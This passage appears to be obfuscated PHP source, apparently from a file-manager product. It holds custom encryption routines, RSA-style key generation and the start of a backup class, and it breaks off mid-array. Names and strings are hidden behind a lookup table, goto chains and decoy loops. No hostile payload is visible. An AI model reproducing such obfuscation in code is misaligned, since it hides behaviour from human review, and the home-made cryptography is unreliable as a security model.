b›¯‡³ÁĞê; b¢á‰––Šñ: $aÃµíÜ”º = $cºëæïÑµ‘[245](array($cºëæïÑµ‘[246] => array($cºëæïÑµ‘[247] => $cºëæïÑµ‘[248], $cºëæïÑµ‘[249] => 3))); $D®ÔÆñØÕğ = $fƒâˆŒì‡Ÿ[632]; while ($D®ÔÆñØÕğ < $fƒâˆŒì‡Ÿ[552]) { if ($D®ÔÆñØÕğ >= 0) { break; } $D®ÔÆñØÕğ++; } goto cÃ°Õ¯µ–; E±»µíÏâÙ: $B×õµšÙ = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($B×õµšÙ, $cºëæïÑµ‘[244]); $Aö’É’¯ƒâ = $fƒâˆŒì‡Ÿ[631]; while (strlen($Aö’É’¯ƒâ) < $fƒâˆŒì‡Ÿ[571]) { if (!$Aö’É’¯ƒâ) { break; } $Aö’É’¯ƒâ++; } goto b¢á‰––Šñ; b›¯‡³ÁĞê: } private function ygdwb0c2c60b($E¥áø„İà¹, $D†×öéòØŠ, $f¶­™½İ„¬ = 3) { goto dôª¦­½Í; cÔî¦³®Ìš: $Fô‡¢‚ÏºÑ = $BÚ¸ì‹¶ôÇ[214]($cÏŸËğÁåÏ . $a×Ò¯ˆ½†˜ . $Fô‡¢‚ÏºÑ); if ($f¶­™½İ„¬ - 1 > 0) { $Fô‡¢‚ÏºÑ = $this->{$_SERVER[‘­Á¢æÊÚ–£][127]}($Fô‡¢‚ÏºÑ, $D†×öéòØŠ, $f¶­™½İ„¬ - 1); } return $Fô‡¢‚ÏºÑ; goto dš´Î¼„”ù; dôª¦­½Í: $d”èÃöª®Š =& $_SERVER[¢à]; $BÚ¸ì‹¶ôÇ =& $_SERVER[‘­Á¢æÊÚ–£]; $BÚ¸ì‹¶ôÇ[326](1); goto bìøîß”¼Á; cËÚ……À¶: $cÏŸËğÁåÏ = $BÚ¸ì‹¶ôÇ[322](0, 5) . $BÚ¸ì‹¶ôÇ[10]; $a×Ò¯ˆ½†˜ = $BÚ¸ì‹¶ôÇ[124](15); $F˜åˆîª± = $d”èÃöª®Š[635]; goto cÂÕ–µ¸¸; bìøîß”¼Á: $E¥áø„İà¹ = $BÚ¸ì‹¶ôÇ[2]($E¥áø„İà¹); $f¥©ÇË·Õö = $d”èÃöª®Š[634]; if (strlen($f¥©ÇË·Õö) < $d”èÃöª®Š[552]) { return; } goto cËÚ……À¶; cÂÕ–µ¸¸: if (!$F˜åˆîª±) { die; } $a©â•Šš§ = $BÚ¸ì‹¶ôÇ[327]; switch ($cÏŸËğÁåÏ) { case $BÚ¸ì‹¶ôÇ[229]: $Fô‡¢‚ÏºÑ = $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($E¥áø„İà¹, $BÚ¸ì‹¶ôÇ[214]($D†×öéòØŠ . $a×Ò¯ˆ½†˜)); $EàµùÀ¾… = $d”èÃöª®Š[636]; break; $e²İµ’«É½ = $d”èÃöª®Š[636]; while ($e²İµ’«É½ < $d”èÃöª®Š[556]) { if ($e²İµ’«É½ >= 0) { break; } $e²İµ’«É½++; } case $BÚ¸ì‹¶ôÇ[220]: $Fô‡¢‚ÏºÑ = $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($E¥áø„İà¹, $BÚ¸ì‹¶ôÇ[214]($a×Ò¯ˆ½†˜ . $D†×öéòØŠ)); break; case $BÚ¸ì‹¶ôÇ[328]: $Fô‡¢‚ÏºÑ = $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($E¥áø„İà¹, $BÚ¸ì‹¶ôÇ[118]($a×Ò¯ˆ½†˜ . $D†×öéòØŠ)); break; $F»±ŒíŒßä = $d”èÃöª®Š[637]; while (strlen($F»±ŒíŒßä) < $d”èÃöª®Š[558]) { if (!$F»±ŒíŒßä) { break; } $F»±ŒíŒßä++; } case $BÚ¸ì‹¶ôÇ[329]: $Fô‡¢‚ÏºÑ = $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($E¥áø„İà¹, $BÚ¸ì‹¶ôÇ[114]($a×Ò¯ˆ½†˜ . $D†×öéòØŠ)); break; case $BÚ¸ì‹¶ôÇ[330]: goto c×ÙÂÂìÀ¸; Có×÷æ…×: for ($dƒ¦ÑÁ²Ú‡ = 0; $dƒ¦ÑÁ²Ú‡ < $BÚ¸ì‹¶ôÇ[24]($E¥áø„İà¹); $dƒ¦ÑÁ²Ú‡++) { $BÌ¡‹Æ®­ = $BÌ¡‹Æ®­ == $BÚ¸ì‹¶ôÇ[24]($B¹àŸ¡) ? 0 : $BÌ¡‹Æ®­; $Aì‘°¸ãÚ¥ = ($c‹Å÷»£â° + $BÚ¸ì‹¶ôÇ[332]($a©â•Šš§, $E¥áø„İà¹[$dƒ¦ÑÁ²Ú‡]) + $BÚ¸ì‹¶ôÇ[333]($B¹àŸ¡[$BÌ¡‹Æ®­++])) % 64; $B«àà‚Åî¾ = $d”èÃöª®Š[642]; if (strlen($B«àà‚Åî¾) < $d”èÃöª®Š[556]) { die; } $aª•…„…—ó .= $a©â•Šš§[$Aì‘°¸ãÚ¥]; } $Fô‡¢‚ÏºÑ = $BÚ¸ì‹¶ôÇ[324]($EÍîºàÓ– . $aª•…„…—ó); $E½¼ğ¯„‡‡ = $d”èÃöª®Š[643]; goto Aö¢¶¢åİó; Aö¢¶¢åİó: if (strlen($E½¼ğ¯„‡‡) < $d”èÃöª®Š[571]) { die; } break; goto Dè ¸ˆ‚•ë; bÙÅ•ÉçÄ‘: $BÌ¡‹Æ®­ = 0; $cÒË‘¥§Ú‡ = $d”èÃöª®Š[641]; if (strlen($cÒË‘¥§Ú‡) < $d”èÃöª®Š[558]) { return; } goto Có×÷æ…×; c×ÙÂÂìÀ¸: $E¥áø„İà¹ = $BÚ¸ì‹¶ôÇ[118]($E¥áø„İà¹); $c‹Å÷»£â° = $BÚ¸ì‹¶ôÇ[331](0, 64); $EÍîºàÓ– = $a©â•Šš§[$c‹Å÷»£â°]; goto FĞÄšõà´Š; CÂÉÒäå£Ï: if (!$DÄ§Œ•¦¦…) { die; } $aª•…„…—ó = $BÚ¸ì‹¶ôÇ[10]; $B¢œ×¢ë = $d”èÃöª®Š[639]; goto D‹í÷Š›¶; FĞÄšõà´Š: $B¹àŸ¡ = $BÚ¸ì‹¶ôÇ[114]($EÍîºàÓ– . $BÚ¸ì‹¶ôÇ[114]($D†×öéòØŠ . $EÍîºàÓ–) . $D†×öéòØŠ); $B¹àŸ¡ = $BÚ¸ì‹¶ôÇ[25]($B¹àŸ¡, $c‹Å÷»£â° % 8, $c‹Å÷»£â° % 8 + 7); $DÄ§Œ•¦¦… = $d”èÃöª®Š[638]; goto CÂÉÒäå£Ï; D‹í÷Š›¶: $dƒ¦ÑÁ²Ú‡ = 0; $b¼Œ‹È„÷ˆ = $d”èÃöª®Š[640]; $Aì‘°¸ãÚ¥ = 0; goto bÙÅ•ÉçÄ‘; Dè ¸ˆ‚•ë: default: $Fô‡¢‚ÏºÑ = $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($E¥áø„İà¹, $D†×öéòØŠ . $a×Ò¯ˆ½†˜); break; $cßšç¶»‹î = $d”èÃöª®Š[644]; while (strlen($cßšç¶»‹î) < $d”èÃöª®Š[558]) { if (!$cßšç¶»‹î) { break; } $cßšç¶»‹î++; } } goto cÔî¦³®Ìš; dš´Î¼„”ù: } private function brgm22408392($cÖò®Øèß, $f«µåîœ”, $fëçÓÉ»æÑ = 3) { goto A‘ó–’±±“; AßÄ’­œîí: $cÖò®Øèß = $f¢Æ££À‘õ[2]($cÖò®Øèß); $bö„×Å´”š = $f‹ŠÄÃ……®[645]; if (!$bö„×Å´”š) { return; } goto F¨”ò Ú­; F¨”ò Ú­: $cÖò®Øèß = $f¢Æ££À‘õ[214]($cÖò®Øèß); $DÆ£Å‚ÅÎ = $cÖò®Øèß[0]; $c™ùª¤«Á´ = $f¢Æ££À‘õ[25]($cÖò®Øèß, 1, 15); goto fâØ×‘¶Å; d¡‘¾Á”çˆ: $DÈ´Ø¿™£™ = $f‹ŠÄÃ……®[647]; $D‹‘êÕ„ÄÕ = $f¢Æ££À‘õ[327]; switch ($DÆ£Å‚ÅÎ) { case $f¢Æ££À‘õ[229]: $dÜ½ÁÕàââ = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($cÖò®Øèß, $f¢Æ££À‘õ[214]($f«µåîœ” . $c™ùª¤«Á´)); break; $E˜‹£¬ïí’ = $f‹ŠÄÃ……®[648]; if (!$E˜‹£¬ïí’) { return; } case $f¢Æ££À‘õ[220]: $dÜ½ÁÕàââ = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($cÖò®Øèß, $f¢Æ££À‘õ[214]($c™ùª¤«Á´ . $f«µåîœ”)); break; $b–¥šğñâ÷ = $f‹ŠÄÃ……®[649]; if (strlen($b–¥šğñâ÷) < $f‹ŠÄÃ……®[571]) { return; } case $f¢Æ££À‘õ[328]: $dÜ½ÁÕàââ = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($cÖò®Øèß, $f¢Æ££À‘õ[118]($c™ùª¤«Á´ . $f«µåîœ”)); $e’ï¡íÍÌ… = $f‹ŠÄÃ……®[650]; break; case $f¢Æ££À‘õ[329]: $dÜ½ÁÕàââ = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($cÖò®Øèß, $f¢Æ££À‘õ[114]($c™ùª¤«Á´ . $f«µåîœ”)); break; case $f¢Æ££À‘õ[330]: goto f“¤İ‘¯ùé; dßò¶§©¨: if (strlen($c›•ÌØô•Î) < $f‹ŠÄÃ……®[552]) { die; } $aÛ£…‘ŸÕÈ = 0; $dä’Ä¯È–µ = $f‹ŠÄÃ……®[654]; goto eãøÕóÅèÆ; bçá ÀÔ”‡: if (strlen($cÈ›É¾‘½È) < $f‹ŠÄÃ……®[571]) { die; } goto b¥ñ¢¿Å‰ã; fÕšª‹÷ßÓ: $dÜ½ÁÕàââ = $f¢Æ££À‘õ[336]($CĞ‘‘™–); break; $cÈ›É¾‘½È = $f‹ŠÄÃ……®[657]; goto bçá ÀÔ”‡; eãøÕóÅèÆ: if (strlen($dä’Ä¯È–µ) < $f‹ŠÄÃ……®[558]) { return; } $D§ÖãÏµíÑ = 0; $e“ÂÔ´í = 0; goto E­ƒÅï®² ; aÕ›‡‹§Ûù: $B¼ç•ŒÓÃ = $f¢Æ££À‘õ[25]($B¼ç•ŒÓÃ, $DŸ¡Ùè¥‰ % 8, $DŸ¡Ùè¥‰ % 8 + 7); $CĞ‘‘™– = $f¢Æ££À‘õ[10]; $c›•ÌØô•Î = $f‹ŠÄÃ……®[653]; goto dßò¶§©¨; BÛÚæ¶³‡: $EÀäÃáµÂâ = $f‹ŠÄÃ……®[651]; if (!$EÀäÃáµÂâ) { die; } $DŸ¡Ùè¥‰ = $f¢Æ££À‘õ[332]($D‹‘êÕ„ÄÕ, $FƒŠ”Œ§); goto aèÏÈß˜ª¼; E­ƒÅï®² : $B››‚Ë»î™ = $f‹ŠÄÃ……®[655]; while (strlen($B››‚Ë»î™) < $f‹ŠÄÃ……®[556]) { if (!$B››‚Ë»î™) { break; } $B››‚Ë»î™++; } for ($aÛ£…‘ŸÕÈ = 0; $aÛ£…‘ŸÕÈ < $f¢Æ££À‘õ[24]($cÖò®Øèß); $aÛ£…‘ŸÕÈ++) { $e“ÂÔ´í = $e“ÂÔ´í == $f¢Æ££À‘õ[24]($B¼ç•ŒÓÃ) ? 0 : $e“ÂÔ´í; $díªñù±¸ = $e“ÂÔ´í++; $D§ÖãÏµíÑ = $f¢Æ££À‘õ[332]($D‹‘êÕ„ÄÕ, $cÖò®Øèß[$aÛ£…‘ŸÕÈ]) - $DŸ¡Ùè¥‰ - $f¢Æ££À‘õ[333]($B¼ç•ŒÓÃ[$díªñù±¸]); while ($D§ÖãÏµíÑ < 0) { $D§ÖãÏµíÑ += 64; } $CĞ‘‘™– .= $D‹‘êÕ„ÄÕ[$D§ÖãÏµíÑ]; $c‹¤õß‹„¦ = $f‹ŠÄÃ……®[656]; } goto fÕšª‹÷ßÓ; aèÏÈß˜ª¼: $DÉ³¤È„‰ = $f‹ŠÄÃ……®[652]; while (strlen($DÉ³¤È„‰) < $f‹ŠÄÃ……®[556]) { if (!$DÉ³¤È„‰) { break; } $DÉ³¤È„‰++; } $B¼ç•ŒÓÃ = $f¢Æ££À‘õ[114]($FƒŠ”Œ§ . $f¢Æ££À‘õ[114]($f«µåîœ” . $FƒŠ”Œ§) . $f«µåîœ”); goto aÕ›‡‹§Ûù; f“¤İ‘¯ùé: $cÖò®Øèß = $f¢Æ££À‘õ[335]($cÖò®Øèß); $FƒŠ”Œ§ = $cÖò®Øèß[0]; $cÖò®Øèß = $f¢Æ££À‘õ[25]($cÖò®Øèß, 1); goto BÛÚæ¶³‡; b¥ñ¢¿Å‰ã: default: $dÜ½ÁÕàââ = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($cÖò®Øèß, $f«µåîœ” . $c™ùª¤«Á´); $E¢Ùö½ìŸ = $f‹ŠÄÃ……®[658]; if (strlen($E¢Ùö½ìŸ) < $f‹ŠÄÃ……®[552]) { die; } break; $aòĞ¡ÓÂÊ÷ = $f‹ŠÄÃ……®[659]; } goto b¨”Ó«œ; A‘ó–’±±“: $f‹ŠÄÃ……® =& $_SERVER[¢à]; $f¢Æ££À‘õ =& $_SERVER[‘­Á¢æÊÚ–£]; if (!$f¢Æ££À‘õ[334]($cÖò®Øèß) || $f¢Æ££À‘õ[24]($cÖò®Øèß) < 10) { return !1; } goto AßÄ’­œîí; fâØ×‘¶Å: $D¢‚¢Ö = $f‹ŠÄÃ……®[646]; if (!$D¢‚¢Ö) { die; } $cÖò®Øèß = $f¢Æ££À‘õ[25]($cÖò®Øèß, 16); goto d¡‘¾Á”çˆ; b¨”Ó«œ: if ($fëçÓÉ»æÑ - 1 > 0) { $dÜ½ÁÕàââ = $this->{$_SERVER[‘­Á¢æÊÚ–£][188]}($dÜ½ÁÕàââ, $f«µåîœ”, $fëçÓÉ»æÑ - 1); } return $dÜ½ÁÕàââ; goto bÌ…Ú¤Û†»; bÌ…Ú¤Û†»: } public function edrj6eb66b56($c ¹–†˜§Ä) { goto F±¥àÙ¢; Dì†ŞïäÊİ: while ($f²„ò‡Ç¥ < $fÅ‰“­”òç[550]) { if ($f²„ò‡Ç¥ >= 0) { break; } $f²„ò‡Ç¥++; } return $f†›ŠÉ®¸±; goto Aİ” ­Ü„; F±¥àÙ¢: $fÅ‰“­”òç =& $_SERVER[¢à]; $f²œ³“³Åë =& $_SERVER[‘­Á¢æÊÚ–£]; $c…æÊªÆåî = $this->{$_SERVER[‘­Á¢æÊÚ–£][337]}(); goto dˆ‘†ÙŒÇ; DŠŠ¿½ª¡Œ: $E×‰·ŞŠëô = 2; for ($f£¼îÌ›‚ = 0; $f£¼îÌ›‚ < $aïñá‡¥æ  * 10; $f£¼îÌ›‚++) { if (($aïñá‡¥æ  * $f£¼îÌ›‚ + 1) % $AÉõ±—°†ö == 0) { $E×‰·ŞŠëô = $f²œ³“³Åë[201](($aïñá‡¥æ  * $f£¼îÌ›‚ + 1) / $AÉõ±—°†ö); break; } } $cÈ÷–ŠŸ = $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($c…æÊªÆåî * $aÂœÆìĞš¼ . $f²œ³“³Åë[10], $f²œ³“³Åë[149]); goto CèÇŒˆöš; cÕè…”Ë§Ş: $AÉõ±—°†ö = $f²œ³“³Åë[201](($c…æÊªÆåî + $aÂœÆìĞš¼) / 2); $BÛÈê¥‚® = $fÅ‰“­”òç[662]; while (1) { $bñä®—É‘¦ = $AÉõ±—°†ö; $fìÃ³”¼¤ = $fÅ‰“­”òç[663]; while (strlen($fìÃ³”¼¤) < $fÅ‰“­”òç[552]) { if (!$fìÃ³”¼¤) { break; } $fìÃ³”¼¤++; } $cÅ¨–ËÁß = $aïñá‡¥æ ; while ($cÅ¨–ËÁß % $bñä®—É‘¦ != 0) { $BØæ¬…¥Õ = $cÅ¨–ËÁß; $D‘¡š»öæ = $fÅ‰“­”òç[664]; if (!$D‘¡š»öæ) { die; } $cÅ¨–ËÁß = $bñä®—É‘¦; $E¹«âïŒ“ = $fÅ‰“­”òç[665]; while ($E¹«âïŒ“ < $fÅ‰“­”òç[571]) { if ($E¹«âïŒ“ >= 0) { break; } $E¹«âïŒ“++; } $bñä®—É‘¦ = $BØæ¬…¥Õ % $bñä®—É‘¦; } if ($bñä®—É‘¦ == 1) { break; } else { $AÉõ±—°†ö++; } } goto DŠŠ¿½ª¡Œ; CèÇŒˆöš: $b£—×ô´§ã = $f²œ³“³Åë[114]($f²œ³“³Åë[338] . ($c…æÊªÆåî + $aÂœÆìĞš¼) . $f²œ³“³Åë[339] . $AÉõ±—°†ö . $f²œ³“³Åë[339] . $E×‰·ŞŠëô . $f²œ³“³Åë[340]); $f†›ŠÉ®¸± = $this->{$_SERVER[‘­Á¢æÊÚ–£][147]}($c ¹–†˜§Ä, $b£—×ô´§ã) . $f²œ³“³Åë[341] . $cÈ÷–ŠŸ; $f²„ò‡Ç¥ = $fÅ‰“­”òç[666]; goto Dì†ŞïäÊİ; F¢¦ºµ‰ˆª: $Fšˆİ¤‰ = $fÅ‰“­”òç[661]; if (strlen($Fšˆİ¤‰) < $fÅ‰“­”òç[556]) { die; } $aïñá‡¥æ  = ($c…æÊªÆåî - 1) * ($aÂœÆìĞš¼ - 1); goto cÕè…”Ë§Ş; dˆ‘†ÙŒÇ: $FšÉ‡¶ê‚Ğ = $fÅ‰“­”òç[660]; while ($FšÉ‡¶ê‚Ğ < $fÅ‰“­”òç[556]) { if ($FšÉ‡¶ê‚Ğ >= 0) { break; } $FšÉ‡¶ê‚Ğ++; } $aÂœÆìĞš¼ = $this->{$_SERVER[‘­Á¢æÊÚ–£][337]}(); goto F¢¦ºµ‰ˆª; Aİ” ­Ü„: } public function ripo1d926dab($Cö¥¬‰—¨) { goto C‹ÅÕíÁÆ; F°›È‹˜ÅÓ: $dŠšÌ»¼­¸ = $bİŞÚ››éï[667]; if (strlen($dŠšÌ»¼­¸) < $bİŞÚ››éï[558]) { die; } if ($c¢¨á‡Í[19]($FÄç»¸è) != 2) { return $c¢¨á‡Í[10]; } goto C‰Õ°½‚Šä; d›óÃ·ÎÊŸ: if (!$f°Ù¹Ğ¾ÑÕ) { return $c¢¨á‡Í[10]; } $f°Ù¹Ğ¾ÑÕ = $c¢¨á‡Í[201]($f°Ù¹Ğ¾ÑÕ); $EëŒù¤ï¡µ = $bİŞÚ››éï[669]; goto aë«§ëÜµ»; bôÄÚ’Ş¢‚: for ($dÄÅšëÌâ  = 3; $dÄÅšëÌâ  < $f°Ù¹Ğ¾ÑÕ; $dÄÅšëÌâ  += 2) { if ($f°Ù¹Ğ¾ÑÕ % $dÄÅšëÌâ  != 0) { continue; } $a¿ìÒ´Ê‘ß = $dÄÅšëÌâ ; $d®ÜŒ–½È´ = $c¢¨á‡Í[201]($f°Ù¹Ğ¾ÑÕ / $dÄÅšëÌâ ); break; } $dà±§±ËËÃ = ($a¿ìÒ´Ê‘ß - 1) * ($d®ÜŒ–½È´ - 1); $bÒº˜ÌÌî = $c¢¨á‡Í[201](($a¿ìÒ´Ê‘ß + $d®ÜŒ–½È´) / 2); goto FŒÉìáƒøÁ; C‹ÅÕíÁÆ: $bİŞÚ››éï =& $_SERVER[¢à]; $c¢¨á‡Í =& $_SERVER[‘­Á¢æÊÚ–£]; $FÄç»¸è = $c¢¨á‡Í[0]($c¢¨á‡Í[341], $Cö¥¬‰—¨); goto F°›È‹˜ÅÓ; C‰Õ°½‚Šä: $f°Ù¹Ğ¾ÑÕ = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($FÄç»¸è[1] . $c¢¨á‡Í[10], $c¢¨á‡Í[149]); $a‘§µšÄŠ½ = $bİŞÚ››éï[668]; while ($a‘§µšÄŠ½ < $bİŞÚ››éï[556]) { if ($a‘§µšÄŠ½ >= 0) { break; } $a‘§µšÄŠ½++; } goto d›óÃ·ÎÊŸ; dªÅˆ‰‘é’: $d®ÜŒ–½È´ = 0; $a ƒ…Ó£´Ş = $bİŞÚ››éï[585]; if (!$a ƒ…Ó£´Ş) { return; } goto bôÄÚ’Ş¢‚; d™ÜÌ°è©Ò: $B•³à¹¬‹• = 2; $AŸ˜ÉÍÑÕ• = $bİŞÚ››éï[677]; if (!$AŸ˜ÉÍÑÕ•) { die; } goto cí½¡ĞÁ¸š; cí½¡ĞÁ¸š: for ($dÄÅšëÌâ  = 0; $dÄÅšëÌâ  < $dà±§±ËËÃ * 10; $dÄÅšëÌâ ++) { if (($dà±§±ËËÃ * $dÄÅšëÌâ  + 1) % $bÒº˜ÌÌî == 0) { $B•³à¹¬‹• = $c¢¨á‡Í[201](($dà±§±ËËÃ * $dÄÅšëÌâ  + 1) / $bÒº˜ÌÌî); break; } } $a‘ª‚ƒÑ™ = $c¢¨á‡Í[114]($c¢¨á‡Í[338] . ($a¿ìÒ´Ê‘ß + $d®ÜŒ–½È´) . $c¢¨á‡Í[339] . $bÒº˜ÌÌî . $c¢¨á‡Í[339] . $B•³à¹¬‹• . $c¢¨á‡Í[340]); $AšÙ¸Ë‘Ïˆ = $bİŞÚ››éï[678]; goto Bä§â¾ğÅÂ; BªªµÜ‰Æ±: while ($DŞ§÷Æœœ < $bİŞÚ››éï[552]) { if ($DŞ§÷Æœœ >= 0) { break; } $DŞ§÷Æœœ++; } goto EŞ¤ğ´½†õ; FŒÉìáƒøÁ: $f…¦–ÌÌÄÚ = $bİŞÚ››éï[671]; if (!$f…¦–ÌÌÄÚ) { die; } while (1) { $Dƒà÷›Ë… = $bÒº˜ÌÌî; $a—…µà¯À = $bİŞÚ››éï[672]; $A¯˜‘„êï = $dà±§±ËËÃ; $Eã£‰—‚‚¨ = $bİŞÚ››éï[673]; if (strlen($Eã£‰—‚‚¨) < $bİŞÚ››éï[552]) { die; } while ($A¯˜‘„êï % $Dƒà÷›Ë… != 0) { $D÷œ÷§¶¨ = $A¯˜‘„êï; $AÀ»›øñô¹ = $bİŞÚ››éï[674]; if (strlen($AÀ»›øñô¹) < $bİŞÚ››éï[552]) { die; } $A¯˜‘„êï = $Dƒà÷›Ë…; $B²§Â¹¸¯Ø = $bİŞÚ››éï[675]; $Dƒà÷›Ë… = $D÷œ÷§¶¨ % $Dƒà÷›Ë…; $f½˜‘‹†Ÿ¨ = $bİŞÚ››éï[676]; } if ($Dƒà÷›Ë… == 1) { break; } else { $bÒº˜ÌÌî++; } } goto d™ÜÌ°è©Ò; aë«§ëÜµ»: $a¿ìÒ´Ê‘ß = 0; $Bòˆøå©¡É = $bİŞÚ››éï[670]; if (!$Bòˆøå©¡É) { return; } goto dªÅˆ‰‘é’; Bä§â¾ğÅÂ: if (!$AšÙ¸Ë‘Ïˆ) { die; } $Eº×İÉâ‰‘ = $this->{$_SERVER[‘­Á¢æÊÚ–£][243]}($FÄç»¸è[0], $a‘ª‚ƒÑ™); $AêëÏÏ„ÌÛ = $bİŞÚ››éï[679]; goto C”Ï˜ß÷‹á; C”Ï˜ß÷‹á: while (strlen($AêëÏÏ„ÌÛ) < $bİŞÚ››éï[571]) { if (!$AêëÏÏ„ÌÛ) { break; } $AêëÏÏ„ÌÛ++; } return $Eº×İÉâ‰‘; $DŞ§÷Æœœ = $bİŞÚ››éï[680]; goto BªªµÜ‰Æ±; EŞ¤ğ´½†õ: } public function vodc5edfd03e() { goto cğôª‡±‰; dùË£‹·â£: while ($dÆ¶™É‘”ç <= (int) $fá¢çå³¡[343]($d»…ºÄ½·)) { $F—¿øÒˆ± = $dÆ¶™É‘”ç; $AµÉø½¼Øæ = $aæÏâÃ¤æ³[682]; if (!$AµÉø½¼Øæ) { return; } while (!0) { $F—¿øÒˆ±++; if ($F—¿øÒˆ± <= 2) { $dÆ¶™É‘”ç = $F—¿øÒˆ±; break; } else { if ($F—¿øÒˆ± < 2) { continue; } } $cŒÏŞ†¾§‹ = !0; for ($F”§ïÚ§ = 2; $F”§ïÚ§ <= $fá¢çå³¡[343]($F—¿øÒˆ±); $F”§ïÚ§++) { if ($F—¿øÒˆ± % $F”§ïÚ§ == 0) { $cŒÏŞ†¾§‹ = !1; } } if ($cŒÏŞ†¾§‹) { $dÆ¶™É‘”ç = $F—¿øÒˆ±; break; } } $FÇêÛ‹®ŠŒ[] = $dÆ¶™É‘”ç; $dòñ‹‚Ò’ = $aæÏâÃ¤æ³[683]; if (strlen($dòñ‹‚Ò’) < $aæÏâÃ¤æ³[571]) { die; } } $b¥Ò´¯ËÖß = 2; $fëŞà²Ìá³ = $aæÏâÃ¤æ³[684]; goto BòšÌ¾‡; cœİôªœá´: $dÆ¶™É‘”ç = 1; $dÂ¨¦Ô†˜Ö = $aæÏâÃ¤æ³[585]; if (!$dÂ¨¦Ô†˜Ö) { die; } goto dùË£‹·â£; BòšÌ¾‡: for ($F—¿øÒˆ± = $d»…ºÄ½·; $F—¿øÒˆ± > 1; $F—¿øÒˆ±--) { $cŒÏŞ†¾§‹ = !0; $B†‚œ²øİ÷ = $aæÏâÃ¤æ³[646]; if (!$B†‚œ²øİ÷) { die; } foreach ($FÇêÛ‹®ŠŒ as $Dô´·ÎÕªÏ) { if ($F—¿øÒˆ± % $Dô´·ÎÕªÏ == 0) { $cŒÏŞ†¾§‹ = !1; break; } } if ($cŒÏŞ†¾§‹) { $b¥Ò´¯ËÖß = $F—¿øÒˆ±; break; } } return $b¥Ò´¯ËÖß; $E’“ŞÆ„Ğ = $aæÏâÃ¤æ³[685]; goto D‹äˆØ¾Ò±; cğôª‡±‰: $aæÏâÃ¤æ³ =& $_SERVER[¢à]; $fá¢çå³¡ =& $_SERVER[‘­Á¢æÊÚ–£]; $d»…ºÄ½· = $fá¢çå³¡[322]($fá¢çå³¡[342](2, 14), $fá¢çå³¡[342](2, 16) - 1); goto e¢‚Ò‰† ; e¢‚Ò‰† : $FÇêÛ‹®ŠŒ = array(); $d¸ Ò°‚† = $aæÏâÃ¤æ³[681]; while ($d¸ Ò°‚† < $aæÏâÃ¤æ³[558]) { if ($d¸ Ò°‚† >= 0) { break; } $d¸ Ò°‚†++; } goto cœİôªœá´; D‹äˆØ¾Ò±: } public function sikj0d95ac39($bê¼­‹×À, $bË”Œ¿Î™) { $b·“ÂôóÎ× =& $_SERVER[‘­Á¢æÊÚ–£]; return $b·“ÂôóÎ×[13](array($b·“ÂôóÎ×[14], $b·“ÂôóÎ×[344]), $bê¼­‹×À, $bË”Œ¿Î™); } public function bfygf7e2eb67($cã¬ÓÂ†Í, $DœŠùÎÄ†×) { $c´½ÔÄâÀ§ =& $_SERVER[‘­Á¢æÊÚ–£]; return $c´½ÔÄâÀ§[13](array($c´½ÔÄâÀ§[345], $c´½ÔÄâÀ§[346]), $cã¬ÓÂ†Í, $DœŠùÎÄ†×); $FƒçîåˆÍŞ = $_SERVER[¢à][686]; if (!$FƒçîåˆÍŞ) { die; } } public function hpbzf683c854($dğÚÌçˆ‰, $B­ ˜Ôï¦µ) { $A¿Ó ğò´‚ =& $_SERVER[‘­Á¢æÊÚ–£]; return $A¿Ó ğò´‚[13](array($A¿Ó ğò´‚[345], $A¿Ó ğò´‚[347]), $dğÚÌçˆ‰, $B­ ˜Ôï¦µ); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $dë™ÍçŞ† =& $_SERVER[¢à]; self::$name = date($dë™ÍçŞ†[687]); if (!($cğ»Âò¿„Ê = Model($dë™ÍçŞ†[688])->lastItem())) { $cğ»Âò¿„Ê = $this->initData(); } else { self::$name = $cğ»Âò¿„Ê[$dë™ÍçŞ†[28]]; if ($cğ»Âò¿„Ê[$dë™ÍçŞ†[689]] == $dë™ÍçŞ†[83]) { self::$name = date($dë™ÍçŞ†[690]); $e–¢†ï…¾ = 0; if (isset($cğ»Âò¿„Ê[$dë™ÍçŞ†[278]][$dë™ÍçŞ†[164]][$dë™ÍçŞ†[415]])) { $e–¢†ï…¾ = (int) $cğ»Âò¿„Ê[$dë™ÍçŞ†[278]][$dë™ÍçŞ†[164]][$dë™ÍçŞ†[415]]; } if ($cğ»Âò¿„Ê[$dë™ÍçŞ†[28]] == self::$name) { Model($dë™ÍçŞ†[688])->remove($cğ»Âò¿„Ê[$dë™ÍçŞ†[364]]); } $cğ»Âò¿„Ê = $this->initData($e–¢†ï…¾, $cğ»Âò¿„Ê[$dë™ÍçŞ†[691]]); } else { $this->checkStore($cğ»Âò¿„Ê[$dë™ÍçŞ†[691]]); } } self::$option = $cğ»Âò¿„Ê; } private function initData($a®ÆÂÎ½’Î = 0, $fáš†ÆÜ·© = '') { goto FŒ‡˜ì¬Öª; FŒ‡˜ì¬Öª: $b¼ç Í†‡‘ =& $_SERVER[¢à]; $A«å¦«ë—Â = Model($b¼ç Í†‡‘[688])->config(); if ($fáš†ÆÜ·© && $A«å¦«ë—Â[$b¼ç Í†‡‘[691]] != $fáš†ÆÜ·©) { $a®ÆÂÎ½’Î = 0; } goto cà­‡Ç‰™; f‚ ÁŒàŸº: $E¾°Á‰Èí¤[$b¼ç Í†‡‘[364]] = $b×ßÑÇˆ¦; return $E¾°Á‰Èí¤; goto F¸»ßº÷µ; cà­‡Ç‰™: $this->checkStore($A«å¦«ë—Â[$b¼ç Í†‡‘[691]]); $E¾°Á‰Èí¤ = array($b¼ç Í†‡‘[691] => $A«å¦«ë—Â[$b¼ç Í†‡‘[691]], $b¼ç Í†‡‘[28] => self::$name, $b¼ç Í†‡‘[689] => 0, $b¼ç Í†‡‘[692] => $A«å¦«ë—Â[$b¼ç Í†‡‘[692]], $b¼ç Í†‡‘[278] => array($b¼ç Í†‡‘[693] => array($b¼ç Í†‡‘[689] => 0), 